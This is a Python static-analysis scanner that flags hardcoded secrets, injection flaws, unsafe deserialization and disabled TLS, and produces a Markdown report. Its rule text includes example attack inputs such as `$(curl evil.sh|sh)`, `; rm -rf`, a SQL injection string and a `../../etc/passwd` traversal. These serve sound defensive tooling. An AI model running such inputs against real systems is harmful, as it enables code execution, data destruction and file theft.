"""
Static application security testing (SAST) engine for uploaded source code.

Scans uploaded files or zipped codebases for common vulnerability patterns
(OWASP Top 10 style issues, hardcoded secrets, insecure crypto, injection
flaws, etc.) using AST analysis for Python and regex heuristics for other
languages. Optionally hands the findings + source to an LLM (Claude) for a
deeper "reasoning" pass that explains exploitation scenarios and prioritizes
remediation -- purely as a defensive code-review aid, not a live attack tool.
"""

import ast
import os
import re
import zipfile
import tempfile
import shutil
from dataclasses import dataclass, field
from enum import Enum
from typing import List, Optional


class Severity(Enum):
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Info"


SEVERITY_ORDER = {
    Severity.CRITICAL: 0,
    Severity.HIGH: 1,
    Severity.MEDIUM: 2,
    Severity.LOW: 3,
    Severity.INFO: 4,
}

# Directories that are never worth scanning (deps, vcs metadata, caches).
SKIP_DIRS = {
    ".git", "node_modules", "venv", ".venv", "__pycache__", "dist", "build",
    ".mypy_cache", ".pytest_cache", "site-packages", ".tox", "vendor",
}

MAX_FILE_BYTES = 1_500_000  # skip anything absurdly large (likely a binary/asset)

TEXT_EXTENSIONS = {
    ".py", ".js", ".jsx", ".ts", ".tsx", ".java", ".go", ".rb", ".php",
    ".c", ".h", ".cpp", ".hpp", ".cs", ".sql", ".sh", ".yml", ".yaml",
    ".json", ".env", ".ini", ".cfg", ".txt", ".html", ".htm", ".rs", ".kt",
}


@dataclass
class Finding:
    title: str
    severity: Severity
    cwe: str
    file: str
    line: int
    snippet: str
    description: str
    exploitation_scenario: str
    remediation: str
    confidence: str = "Medium"


@dataclass
class ScanResult:
    findings: List[Finding] = field(default_factory=list)
    files_scanned: int = 0
    files_skipped: int = 0

    def sorted_findings(self) -> List[Finding]:
        return sorted(self.findings, key=lambda f: (SEVERITY_ORDER[f.severity], f.file, f.line))

    def counts_by_severity(self) -> dict:
        counts = {s: 0 for s in Severity}
        for f in self.findings:
            counts[f.severity] += 1
        return counts

    def risk_score(self) -> int:
        """0-100, weighted by severity, capped at 100."""
        weights = {
            Severity.CRITICAL: 25,
            Severity.HIGH: 12,
            Severity.MEDIUM: 5,
            Severity.LOW: 2,
            Severity.INFO: 0,
        }
        return min(100, sum(weights[f.severity] for f in self.findings))


# ---------------------------------------------------------------------------
# Regex-based rules (language-agnostic heuristics, run on every text file)
# ---------------------------------------------------------------------------

@dataclass
class RegexRule:
    title: str
    pattern: re.Pattern
    severity: Severity
    cwe: str
    description: str
    exploitation_scenario: str
    remediation: str
    confidence: str = "Medium"


REGEX_RULES: List[RegexRule] = [
    RegexRule(
        title="Hardcoded secret / credential",
        pattern=re.compile(
            r"""(?i)\b(api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token|password|passwd|pwd|client[_-]?secret)\s*[:=]\s*["'][A-Za-z0-9_\-\/\+=]{8,}["']"""
        ),
        severity=Severity.HIGH,
        cwe="CWE-798",
        description="A credential-like value is hardcoded directly in source rather than loaded from a secrets manager or environment variable.",
        exploitation_scenario="Anyone with read access to the repository (including via a leaked build artifact, git history, or a public fork) obtains the credential and can use it to authenticate as the application.",
        remediation="Move the value to an environment variable or a secrets manager (e.g. AWS Secrets Manager, Vault) and rotate the exposed credential immediately.",
    ),
    RegexRule(
        title="AWS access key ID exposed",
        pattern=re.compile(r"\b(AKIA|ASIA)[0-9A-Z]{16}\b"),
        severity=Severity.CRITICAL,
        cwe="CWE-798",
        description="An AWS access key ID literal was found in source.",
        exploitation_scenario="If the matching secret key is also present (in this file, history, or a paired config), an attacker gains programmatic AWS access scoped to whatever the key's IAM policy allows.",
        remediation="Revoke/rotate the key in IAM immediately, purge it from git history, and load credentials via an instance role, OIDC, or a secrets manager instead.",
        confidence="High",
    ),
    RegexRule(
        title="Private key material committed",
        pattern=re.compile(r"-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
        severity=Severity.CRITICAL,
        cwe="CWE-321",
        description="A PEM-encoded private key is embedded in the codebase.",
        exploitation_scenario="Anyone who obtains the file can impersonate the key's owner (SSH access, TLS termination, signed tokens, etc.).",
        remediation="Remove the key from the repo and history, rotate/reissue it, and store private keys outside of source control (KMS, secrets manager, mounted secret volume).",
        confidence="High",
    ),
    RegexRule(
        title="SQL query built via string concatenation/formatting",
        pattern=re.compile(
            r"""(?i)(execute|executemany|query|cursor\.execute)\s*\(\s*(f?["'].*?(SELECT|INSERT|UPDATE|DELETE)\b.*?["']\s*(\+|%|\.format\()|f["'].*?\{.*?\}.*?(SELECT|INSERT|UPDATE|DELETE))"""
        ),
        severity=Severity.HIGH,
        cwe="CWE-89",
        description="A SQL statement appears to be assembled by concatenating or formatting untrusted input directly into the query string.",
        exploitation_scenario="An attacker supplies input like `' OR '1'='1` or a UNION-based payload through the concatenated field, altering the query's logic to bypass auth, exfiltrate other rows, or in some engines execute stacked queries.",
        remediation="Use parameterized queries / prepared statements (e.g. `cursor.execute(sql, params)`), or an ORM's parameter binding, instead of string interpolation.",
    ),
    RegexRule(
        title="Command executed via shell with dynamic input",
        pattern=re.compile(r"(?i)(os\.system|os\.popen|subprocess\.(call|run|Popen|check_output))\s*\([^)]*\+"),
        severity=Severity.CRITICAL,
        cwe="CWE-78",
        description="A shell command is being built by concatenating variables into the command string/argument list.",
        exploitation_scenario="If any concatenated segment derives from user input, an attacker can inject shell metacharacters (`; rm -rf`, `$(curl evil.sh|sh)`) to run arbitrary commands with the process's privileges.",
        remediation="Avoid shell=True; pass arguments as a list to subprocess.run()/Popen() with shell=False, and validate/allowlist any user-supplied arguments.",
    ),
    RegexRule(
        title="subprocess/exec invoked with shell=True",
        pattern=re.compile(r"shell\s*=\s*True"),
        severity=Severity.MEDIUM,
        cwe="CWE-78",
        description="shell=True causes the command string to be interpreted by a shell, enabling metacharacter injection if any part of the command includes untrusted input.",
        exploitation_scenario="Untrusted input reaching this call can chain additional shell commands using `;`, `&&`, backticks, or `$()`.",
        remediation="Set shell=False (the default) and pass the command as a list of arguments.",
        confidence="Low",
    ),
    RegexRule(
        title="Insecure deserialization (pickle/yaml)",
        pattern=re.compile(r"(?i)(pickle\.load|pickle\.loads|yaml\.load\s*\((?!.*Loader\s*=\s*yaml\.SafeLoader))"),
        severity=Severity.CRITICAL,
        cwe="CWE-502",
        description="Untrusted data may be deserialized with pickle or an unsafe yaml.load(), both of which can execute arbitrary code embedded in the payload.",
        exploitation_scenario="An attacker who can influence the serialized blob (uploaded file, cache, cookie, message queue payload) crafts a payload that triggers `__reduce__`/constructor code, achieving remote code execution when it's deserialized.",
        remediation="Use yaml.safe_load(), or replace pickle with a safe format (JSON, protobuf) for anything that crosses a trust boundary.",
    ),
    RegexRule(
        title="eval()/exec() on dynamic input",
        pattern=re.compile(r"\b(eval|exec)\s*\("),
        severity=Severity.HIGH,
        cwe="CWE-95",
        description="eval()/exec() interpret a string as code at runtime.",
        exploitation_scenario="If the argument includes any attacker-influenced data, the attacker can execute arbitrary Python in the process.",
        remediation="Replace eval/exec with a safe parser (ast.literal_eval for literals, a dedicated expression grammar, or a lookup table of allowed operations).",
    ),
    RegexRule(
        title="Weak hash used for security purposes",
        pattern=re.compile(r"(?i)\b(hashlib\.)?(md5|sha1)\s*\("),
        severity=Severity.MEDIUM,
        cwe="CWE-327",
        description="MD5/SHA1 are cryptographically broken and unsuitable for passwords, tokens, or integrity checks against a motivated attacker.",
        exploitation_scenario="Collision/preimage weaknesses let an attacker forge a value with the same digest (e.g. bypass an integrity check) or, for password hashes, crack them far faster than a modern KDF.",
        remediation="Use bcrypt/scrypt/argon2 for passwords, and SHA-256/SHA-3 (with HMAC where authentication is needed) for integrity checks.",
        confidence="Low",
    ),
    RegexRule(
        title="TLS certificate verification disabled",
        pattern=re.compile(r"(?i)(verify\s*=\s*False|ssl\._create_unverified_context|InsecureRequestWarning|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*['\"]?0)"),
        severity=Severity.HIGH,
        cwe="CWE-295",
        description="TLS certificate verification is explicitly disabled for an HTTP client.",
        exploitation_scenario="A network-positioned attacker (MITM on public Wi-Fi, compromised router, DNS spoofing) can intercept and tamper with traffic that the client believes is secure.",
        remediation="Remove the verify=False / unverified context override; if a private CA is in play, pass its CA bundle via `verify=<path-to-ca-bundle>` instead of disabling verification.",
    ),
    RegexRule(
        title="Debug mode enabled",
        pattern=re.compile(r"(?i)(debug\s*=\s*True|DEBUG\s*=\s*True|app\.run\([^)]*debug\s*=\s*True)"),
        severity=Severity.MEDIUM,
        cwe="CWE-489",
        description="Framework debug mode is enabled, which typically exposes stack traces, source snippets, and (for Flask's Werkzeug debugger) an interactive console.",
        exploitation_scenario="An unhandled exception on a debug-enabled Flask app can expose the Werkzeug debugger, which allows arbitrary code execution if the debugger PIN isn't protected, plus leaks environment variables and source in stack traces.",
        remediation="Ensure debug is disabled in any environment reachable from outside localhost; gate it behind an environment variable defaulting to False.",
        confidence="Low",
    ),
    RegexRule(
        title="Wildcard CORS origin",
        pattern=re.compile(r"(?i)Access-Control-Allow-Origin['\"]?\s*[:=]\s*['\"]\*['\"]"),
        severity=Severity.MEDIUM,
        cwe="CWE-942",
        description="CORS is configured to allow any origin.",
        exploitation_scenario="A malicious website can make cross-origin requests to this API using a victim's browser session/cookies (if credentials are also allowed) and read the response, enabling data theft.",
        remediation="Restrict Access-Control-Allow-Origin to an explicit allowlist of trusted origins, and never combine `*` with Access-Control-Allow-Credentials: true.",
    ),
    RegexRule(
        title="Unsanitized HTML rendering (potential XSS)",
        pattern=re.compile(r"(?i)(\.innerHTML\s*=|document\.write\s*\(|dangerouslySetInnerHTML|render_template_string\s*\(|Markup\s*\(|unsafe_allow_html\s*=\s*True)"),
        severity=Severity.MEDIUM,
        cwe="CWE-79",
        description="User-influenced content may be rendered as raw HTML/JS without escaping.",
        exploitation_scenario="If any of the rendered content originates from user input (query params, form fields, stored records), an attacker injects a `<script>` payload that runs in victims' browsers -- stealing session cookies, tokens, or performing actions as the victim.",
        remediation="Escape/encode dynamic content before rendering, or use the templating engine's autoescaping (avoid |safe, Markup(), dangerouslySetInnerHTML for anything derived from user input).",
        confidence="Low",
    ),
    RegexRule(
        title="JWT signature verification disabled or alg=none",
        pattern=re.compile(r"(?i)(verify_signature['\"]?\s*:\s*False|algorithms\s*=\s*\[\s*['\"]none['\"]\s*\]|verify\s*=\s*False.*jwt)"),
        severity=Severity.CRITICAL,
        cwe="CWE-347",
        description="JWT verification is disabled, or the 'none' algorithm is explicitly permitted.",
        exploitation_scenario="An attacker crafts a token with alg=none (or any payload, since it's unverified) and is trusted as any user/role encoded in the token, achieving full authentication bypass.",
        remediation="Always verify signatures with an explicit allowlist of strong algorithms (e.g. RS256/ES256); never accept 'none'.",
        confidence="High",
    ),
    RegexRule(
        title="Path built from user input without sanitization",
        pattern=re.compile(r"(?i)(open|send_file|os\.path\.join)\s*\([^)]*request\.(args|form|values|GET|POST)"),
        severity=Severity.HIGH,
        cwe="CWE-22",
        description="A filesystem path appears to be built directly from a request parameter.",
        exploitation_scenario="An attacker supplies `../../etc/passwd`-style input to escape the intended directory and read (or with write endpoints, overwrite) arbitrary files on the host.",
        remediation="Resolve the final path and verify it stays within an allowed base directory (e.g. compare against `os.path.realpath(base)`), and reject path separators/`..` in the input.",
    ),
    RegexRule(
        title="Insecure random used for security-sensitive value",
        pattern=re.compile(r"(?i)(random\.random|random\.randint|random\.choice)\s*\([^)]*\).{0,40}(token|password|secret|otp|reset)"),
        severity=Severity.MEDIUM,
        cwe="CWE-330",
        description="Python's `random` module is not cryptographically secure and appears near a security-sensitive term (token/password/OTP).",
        exploitation_scenario="An attacker who can observe enough outputs (or knows the Mersenne Twister state) can predict future 'random' tokens, enabling session/token/reset-link forgery.",
        remediation="Use the `secrets` module (e.g. secrets.token_urlsafe()) for anything security-sensitive.",
        confidence="Low",
    ),
]


# ---------------------------------------------------------------------------
# Python AST-based checks (more precise than regex for this one language)
# ---------------------------------------------------------------------------

def _snippet(lines: List[str], lineno: int) -> str:
    idx = lineno - 1
    if 0 <= idx < len(lines):
        return lines[idx].strip()[:200]
    return ""


def _scan_python_ast(filename: str, source: str, findings: List[Finding]) -> None:
    try:
        tree = ast.parse(source, filename=filename)
    except SyntaxError:
        return  # fall back to regex-only for files that don't parse

    lines = source.splitlines()

    class Visitor(ast.NodeVisitor):
        def visit_Call(self, node: ast.Call):
            func_name = self._dotted_name(node.func)

            if func_name in ("subprocess.Popen", "subprocess.call", "subprocess.run", "subprocess.check_output", "os.system", "os.popen"):
                for arg in node.args:
                    if not isinstance(arg, (ast.Constant, ast.List)):
                        findings.append(Finding(
                            title="Dynamic value passed to shell/subprocess call",
                            severity=Severity.HIGH,
                            cwe="CWE-78",
                            file=filename,
                            line=node.lineno,
                            snippet=_snippet(lines, node.lineno),
                            description=f"`{func_name}` is called with a non-literal argument, so its value depends on runtime data.",
                            exploitation_scenario="If the value traces back to user input, an attacker can inject shell metacharacters or an entirely different command.",
                            remediation="Pass a fixed argument list, validate/allowlist any dynamic component, and avoid shell=True.",
                            confidence="Low",
                        ))
                        break

            if func_name == "assert":
                pass  # handled via ast.Assert below

            self.generic_visit(node)

        def visit_Assert(self, node: ast.Assert):
            findings.append(Finding(
                title="Security check implemented with `assert`",
                severity=Severity.LOW,
                cwe="CWE-703",
                file=filename,
                line=node.lineno,
                snippet=_snippet(lines, node.lineno),
                description="`assert` statements are stripped out when Python runs with the -O optimization flag.",
                exploitation_scenario="If this assert enforces an authorization or input-validation invariant, running the app with `-O` silently removes the check, and an attacker can then bypass whatever it was guarding.",
                remediation="Replace security-relevant assertions with explicit `if ...: raise ...` checks that can't be optimized away.",
                confidence="Low",
            ))
            self.generic_visit(node)

        @staticmethod
        def _dotted_name(node) -> Optional[str]:
            parts = []
            while isinstance(node, ast.Attribute):
                parts.append(node.attr)
                node = node.value
            if isinstance(node, ast.Name):
                parts.append(node.id)
                return ".".join(reversed(parts))
            return None

    Visitor().visit(tree)


# ---------------------------------------------------------------------------
# File / archive handling
# ---------------------------------------------------------------------------

def _iter_scan_targets(root: str):
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS and not d.startswith(".")]
        for name in filenames:
            path = os.path.join(dirpath, name)
            ext = os.path.splitext(name)[1].lower()
            if ext in TEXT_EXTENSIONS:
                yield path


def _read_text(path: str) -> Optional[str]:
    try:
        if os.path.getsize(path) > MAX_FILE_BYTES:
            return None
        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
            return fh.read()
    except (OSError, UnicodeDecodeError):
        return None


def scan_file(display_name: str, source: str, findings: List[Finding]) -> None:
    lines = source.splitlines()

    for rule in REGEX_RULES:
        for m in rule.pattern.finditer(source):
            lineno = source.count("\n", 0, m.start()) + 1
            findings.append(Finding(
                title=rule.title,
                severity=rule.severity,
                cwe=rule.cwe,
                file=display_name,
                line=lineno,
                snippet=_snippet(lines, lineno),
                description=rule.description,
                exploitation_scenario=rule.exploitation_scenario,
                remediation=rule.remediation,
                confidence=rule.confidence,
            ))

    if display_name.endswith(".py"):
        _scan_python_ast(display_name, source, findings)


def scan_paths(paths_with_content) -> ScanResult:
    """paths_with_content: iterable of (display_name, source_text)."""
    result = ScanResult()
    for display_name, source in paths_with_content:
        if source is None:
            result.files_skipped += 1
            continue
        result.files_scanned += 1
        scan_file(display_name, source, result.findings)
    return result


def scan_uploaded_file(filename: str, raw_bytes: bytes) -> ScanResult:
    """Handle a single uploaded file, transparently expanding .zip archives."""
    if filename.lower().endswith(".zip"):
        tmpdir = tempfile.mkdtemp(prefix="vulnscan_")
        try:
            zip_path = os.path.join(tmpdir, "upload.zip")
            with open(zip_path, "wb") as fh:
                fh.write(raw_bytes)
            try:
                with zipfile.ZipFile(zip_path) as zf:
                    zf.extractall(tmpdir, members=_safe_members(zf, tmpdir))
            except zipfile.BadZipFile:
                return ScanResult(files_skipped=1)

            def gen():
                for path in _iter_scan_targets(tmpdir):
                    rel = os.path.relpath(path, tmpdir)
                    yield rel, _read_text(path)

            return scan_paths(gen())
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)
    else:
        ext = os.path.splitext(filename)[1].lower()
        if ext not in TEXT_EXTENSIONS and ext != "":
            return ScanResult(files_skipped=1)
        try:
            text = raw_bytes.decode("utf-8", errors="ignore")
        except Exception:
            return ScanResult(files_skipped=1)
        return scan_paths([(filename, text)])


def _safe_members(zf: zipfile.ZipFile, dest_dir: str):
    """Guard against zip-slip path traversal when extracting archive members."""
    dest_root = os.path.realpath(dest_dir)
    safe = []
    for member in zf.infolist():
        target = os.path.realpath(os.path.join(dest_dir, member.filename))
        if target == dest_root or target.startswith(dest_root + os.sep):
            safe.append(member)
    return safe


# ---------------------------------------------------------------------------
# Report rendering
# ---------------------------------------------------------------------------

def render_markdown_report(result: ScanResult, source_label: str) -> str:
    counts = result.counts_by_severity()
    lines = [
        f"# Static Security Review -- {source_label}",
        "",
        f"Files scanned: **{result.files_scanned}**  |  Files skipped: **{result.files_skipped}**  |  "
        f"Risk score: **{result.risk_score()}/100**",
        "",
        "| Severity | Count |",
        "|---|---|",
    ]
    for sev in Severity:
        lines.append(f"| {sev.value} | {counts[sev]} |")
    lines.append("")
    lines.append("---")

    for f in result.sorted_findings():
        lines += [
            "",
            f"## [{f.severity.value}] {f.title}",
            f"**File:** `{f.file}:{f.line}`  |  **CWE:** {f.cwe}  |  **Confidence:** {f.confidence}",
            "",
            f"```\n{f.snippet}\n```",
            "",
            f"**Description:** {f.description}",
            "",
            f"**Exploitation scenario:** {f.exploitation_scenario}",
            "",
            f"**Remediation:** {f.remediation}",
        ]

    if not result.findings:
        lines.append("\nNo issues matched the static rule set. This is not a guarantee of security -- "
                      "consider a manual review and, where authorized, dynamic/pen testing for anything internet-facing.")

    return "\n".join(lines)
